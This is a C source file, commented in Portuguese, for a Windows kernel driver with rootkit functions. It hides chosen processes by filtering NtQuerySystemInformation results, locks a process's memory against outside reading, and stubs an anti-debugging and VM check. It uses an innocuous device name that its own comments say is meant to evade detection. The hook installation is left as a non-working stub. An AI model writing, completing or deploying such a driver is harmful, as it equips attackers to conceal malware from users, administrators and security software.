#include <ntddk.h>
#include <wdm.h>

// Evitar detecção com nomes óbvios
#define DRIVER_NAME "SystemServicesExtension"
#define DEVICE_NAME L"\\Device\\SystemServicesExtension"
#define SYMLINK_NAME L"\\DosDevices\\SystemServicesExtension"

// Códigos de controle IOCTL
#define IOCTL_BASE 0x800
#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PROTECT_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CHECK_SECURITY CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 3, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Estruturas para comunicação
typedef struct _HIDE_REQUEST {
    ULONG pid;
    BOOLEAN hide;
} HIDE_REQUEST, *PHIDE_REQUEST;

typedef struct _MEMORY_PROTECTION_REQUEST {
    ULONG pid;
    PVOID address;
    SIZE_T size;
} MEMORY_PROTECTION_REQUEST, *PMEMORY_PROTECTION_REQUEST;

// Protótipos de funções
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
NTSTATUS CreateCloseDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Função original que será hookeada
typedef NTSTATUS (*PNT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = NULL;

// Lista de PIDs a ocultar
#define MAX_HIDDEN_PIDS 16
ULONG HiddenPids[MAX_HIDDEN_PIDS] = {0};
ULONG HiddenPidCount = 0;

// Funções auxiliares
BOOLEAN IsProcessHidden(ULONG pid) {
    for (ULONG i = 0; i < HiddenPidCount; i++) {
        if (HiddenPids[i] == pid) {
            return TRUE;
        }
    }
    return FALSE;
}

NTSTATUS AddHiddenProcess(ULONG pid) {
    if (HiddenPidCount >= MAX_HIDDEN_PIDS) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Verifica se o PID já está na lista
    if (IsProcessHidden(pid)) {
        return STATUS_SUCCESS;
    }
    
    HiddenPids[HiddenPidCount++] = pid;
    return STATUS_SUCCESS;
}

// Função hook para NtQuerySystemInformation
NTSTATUS HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    // Manipular apenas se a consulta for sobre informações do processo
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION previous = NULL;
        
        while (current) {
            ULONG pid = (ULONG)(ULONG_PTR)current->UniqueProcessId;
            
            if (IsProcessHidden(pid)) {
                // Remover este processo da lista
                if (previous) {
                    if (current->NextEntryOffset) {
                        previous->NextEntryOffset += current->NextEntryOffset;
                    } else {
                        previous->NextEntryOffset = 0;
                    }
                } else {
                    // O primeiro processo precisa ser tratado de forma especial
                    if (current->NextEntryOffset) {
                        RtlCopyMemory(
                            SystemInformation,
                            (PUCHAR)current + current->NextEntryOffset,
                            SystemInformationLength - current->NextEntryOffset
                        );
                        
                        // Reiniciar o loop
                        current = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
                        continue;
                    }
                }
            } else {
                previous = current;
            }
            
            if (current->NextEntryOffset) {
                current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);
            } else {
                break;
            }
        }
    }
    
    return status;
}

// Função para instalar o hook
NTSTATUS InstallHook() {
    UNICODE_STRING routineName;
    RtlInitUnicodeString(&routineName, L"NtQuerySystemInformation");
    
    OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)MmGetSystemRoutineAddress(&routineName);
    
    if (!OriginalNtQuerySystemInformation) {
        return STATUS_NOT_FOUND;
    }
    
    // O hook real normalmente requer técnicas como IAT hooking ou inline hooking
    // Esta é uma implementação simplificada para fins de demonstração
    // Aqui, é necessário usar técnicas de patch de memória protegida
    
    return STATUS_SUCCESS;
}

// Função para remover o hook
NTSTATUS RemoveHook() {
    // Restaurar função original
    return STATUS_SUCCESS;
}

// Função para proteger a memória do processo contra leitura
NTSTATUS ProtectProcessMemory(ULONG pid, PVOID address, SIZE_T size) {
    PEPROCESS process;
    NTSTATUS status;
    KAPC_STATE apcState;
    
    status = PsLookupProcessByProcessId((HANDLE)pid, &process);
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    KeStackAttachProcess(process, &apcState);
    
    // Alterar proteção da memória
    MEMORY_BASIC_INFORMATION memInfo;
    SIZE_T retSize;
    
    status = ZwQueryVirtualMemory(
        ZwCurrentProcess(),
        address,
        MemoryBasicInformation,
        &memInfo,
        sizeof(memInfo),
        &retSize
    );
    
    if (NT_SUCCESS(status)) {
        // Modificar a proteção para impedir leitura externa
        ULONG oldProtect;
        status = ZwProtectVirtualMemory(
            ZwCurrentProcess(),
            &address,
            &size,
            PAGE_NOACCESS,
            &oldProtect
        );
    }
    
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);
    
    return status;
}

// Função principal do driver
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status;
    UNICODE_STRING deviceName, symLinkName;
    PDEVICE_OBJECT deviceObject;
    
    // Inicializar strings
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);
    
    // Criar o dispositivo
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Configurar funções de dispatch
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatch;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatch;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;
    
    // Criar link simbólico
    status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }
    
    // Instalar hook
    status = InstallHook();
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("%s: Failed to install hook: 0x%X\n", DRIVER_NAME, status);
        IoDeleteSymbolicLink(&symLinkName);
        IoDeleteDevice(deviceObject);
        return status;
    }
    
    // Configurar tipo de I/O para buffer
    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    
    DbgPrint("%s: Driver loaded successfully\n", DRIVER_NAME);
    return STATUS_SUCCESS;
}

// Função de descarga do driver
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLinkName;
    
    // Remover hook
    RemoveHook();
    
    // Remover symlink e dispositivo
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symLinkName);
    IoDeleteDevice(DriverObject->DeviceObject);
    
    DbgPrint("%s: Driver unloaded\n", DRIVER_NAME);
}

// Handler para Create/Close
NTSTATUS CreateCloseDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

// Handler para DeviceControl
NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
    ULONG inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
    PVOID outputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG bytesReturned = 0;
    
    switch (ioControlCode) {
        case IOCTL_HIDE_PROCESS:
            if (inputBufferLength >= sizeof(HIDE_REQUEST)) {
                PHIDE_REQUEST request = (PHIDE_REQUEST)inputBuffer;
                
                if (request->hide) {
                    status = AddHiddenProcess(request->pid);
                    DbgPrint("%s: Hiding process %lu: 0x%X\n", DRIVER_NAME, request->pid, status);
                } else {
                    // Implementar remoção caso seja necessário
                    status = STATUS_NOT_IMPLEMENTED;
                }
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
            
        case IOCTL_PROTECT_MEMORY:
            if (inputBufferLength >= sizeof(MEMORY_PROTECTION_REQUEST)) {
                PMEMORY_PROTECTION_REQUEST request = (PMEMORY_PROTECTION_REQUEST)inputBuffer;
                status = ProtectProcessMemory(request->pid, request->address, request->size);
                DbgPrint("%s: Protecting memory at %p size %zu: 0x%X\n", 
                         DRIVER_NAME, request->address, request->size, status);
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
            
        case IOCTL_CHECK_SECURITY:
            // Implementar verificação de segurança
            // Ex: Verificar se o processo está sendo depurado, se está em VM, etc.
            if (outputBufferLength >= sizeof(ULONG)) {
                *(PULONG)outputBuffer = 1; // OK
                bytesReturned = sizeof(ULONG);
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
            
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
    
    // Completar a IRP
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}